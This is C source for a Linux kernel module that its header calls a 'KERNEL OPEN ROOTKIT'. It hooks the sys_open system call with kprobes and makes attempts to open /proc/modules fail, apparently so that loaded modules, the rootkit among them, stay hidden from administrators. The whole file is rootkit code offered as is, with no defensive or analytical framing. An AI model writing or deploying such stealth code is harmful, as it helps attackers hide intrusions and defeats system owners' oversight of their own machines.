/*
 * rootkit.c - Thomas Moussajee 
 */

#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/types.h>
#include <linux/syscalls.h>
#include <asm/uaccess.h>
#include <asm/cacheflush.h>
#include <linux/delay.h> 
#include <linux/fcntl.h>
#include <linux/kprobes.h>
#include <asm/uaccess.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("THOMAS MOUSSAJEE");
MODULE_DESCRIPTION("KERNEL OPEN ROOTKIT");

static char hidden;

asmlinkage long new_sys_open(const char __user *filename, int flags, umode_t mode)
{
  if (strcmp(filename, "/proc/modules") == 0)
    hidden = 1;
  else
    hidden = 0;
  jprobe_return();
  return 0;
}

static int open_ret_handler(struct kretprobe_instance *ri, struct pt_regs *regs)
{
  if (hidden)
    {
      regs->ax = -1;
    }
  return 0;
}
      
static struct jprobe my_jprobe = {
  .entry= new_sys_open,
  .kp = {
    .symbol_name = "sys_open",
  },
};

static struct kretprobe mprotect_kretprobe =
  {
    .handler = open_ret_handler,
    .maxactive = 100
  };


int init_module(void)
{
  int ret = 0;

  hidden = 0;
  ret = register_jprobe(&my_jprobe);  
  mprotect_kretprobe.kp.addr = (kprobe_opcode_t *)kallsyms_lookup_name("sys_open");
  register_kretprobe(&mprotect_kretprobe);
  return ret;
}

void cleanup_module(void)
{
  unregister_jprobe(&my_jprobe);
}
